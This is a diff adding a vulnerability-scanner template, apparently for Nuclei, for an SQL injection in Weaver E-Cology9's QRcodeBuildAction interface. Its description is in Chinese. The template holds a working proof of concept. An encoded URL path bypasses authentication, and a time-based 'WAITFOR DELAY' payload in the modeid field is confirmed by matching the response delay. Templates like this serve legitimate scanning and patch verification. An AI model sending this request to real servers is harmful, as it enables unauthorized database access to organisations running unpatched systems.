@@ -1,0 +1,39 @@
+id: weaver-ecology-v9-QRcodeBuildAction-sqli
+info:
+  name: 泛微 E-Cology9 QRcodeBuildAction - sqli
+  author: leadlife
+  severity: high
+  description: 由于泛微 E-Cology9 weaver.formmode.servelt.QRcodeBuildAction接口未对用户传入的数据进行严格的校验和过滤，导致攻击者利用多层编码的方式绕过身份认证进行SQL注入。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEE-Cology9%E5%B9%B3%E5%8F%B0QRcodeBuildAction%E5%AD%98%E5%9C%A8%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+    - https://blog.csdn.net/qq_41904294/article/details/131666128
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips: 二次验证漏洞可直接修改 modeid 的 number 进行验证
+    repair:
+    sqlmap:
+    version: Ecology 9.x 补丁版本 < 10.58.0 Ecology 8.x 补丁版本 < 10.58.0
+  tags: 2023,sqli,time,weaver,ecology
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /weaver/weaver.formmode.servelt.QRcodeBuildAction/login/LoginSSO.%25%36%61%25%37%33%25%37%30 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+        
+        modeid=127+WAITFOR+DELAY+'0%3a0%3a6'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
